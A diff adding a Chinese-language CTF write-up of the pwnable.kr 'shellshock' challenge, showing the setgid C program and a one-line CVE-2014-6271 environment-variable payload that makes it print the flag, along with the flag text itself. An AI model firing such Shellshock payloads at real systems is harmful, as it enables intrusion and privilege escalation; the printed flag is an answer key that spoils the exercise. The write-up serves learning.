@@ -574,3 +574,49 @@ int main(int argc, char* argv[]){
     Password OK
     Mommy, the operator priority always confuses me :(\
     
+### [shellshock]
+
+> Mommy, there was a shocking news about bash.
+> I bet you already know, but lets just make it sure :)
+> 
+> ssh shellshock@pwnable.kr -p2222 (pw:guest)
+
+很明显该题考察 Bash 破壳漏洞 CVE-2014-6271，漏洞相关详情可参考[这里](https://access.redhat.com/articles/1200223)。
+
+连上服务器后，路径有下面几个文件：
+
+	shellshock@ubuntu:~$ ls -al
+	total 976
+	drwxr-x---  4 root shellshock    4096 Oct 12  2014 .
+	dr-xr-xr-x 58 root root          4096 Feb  5 08:35 ..
+	-r-xr-xr-x  1 root shellshock2 959120 Oct 12  2014 bash
+	d---------  2 root root          4096 Oct 12  2014 .bash_history
+	-r--r-----  1 root shellshock2     47 Oct 12  2014 flag
+	dr-xr-xr-x  2 root root          4096 Oct 12  2014 .irssi
+	-r-xr-sr-x  1 root shellshock2   8547 Oct 12  2014 shellshock
+	-rw-r-----  1 root shellshock     188 Oct 12  2014 shellshock.c
+	shellshock@ubuntu:~$
+
+可以看到 `shellshock` 和 `flag` 的 GROUP 都为 `shellshock2`，而当前用户组为 `shellshock`，这里通过查看 `shellshock.c` 源码发现，可以利用 shellshock 漏洞来在 `shellshock` 程序的环境中设置好 UID 和 GID 然后去执行 `cat flag`。`shellshock.c` 源码如下：
+
+{% highlight c %}
+#include <stdio.h>
+int main(){
+	setresuid(getegid(), getegid(), getegid());
+	setresgid(getegid(), getegid(), getegid());
+	system("/home/shellshock/bash -c 'echo shock_me'");
+	return 0;
+}
+{% endhighlight %}
+
+`/home/shellshock/bash` 经过测试存在 shellshock 漏洞：
+
+![]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/shellshock-1.png)
+
+因此直接构造 Payload：`env x='() { :;}; /bin/cat flag' ./shellshock` 即可得到 flag：
+
+	shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock
+	only if I knew CVE-2014-6271 ten years ago..!!
+	Segmentation fault
+	shellshock@ubuntu:~$
+
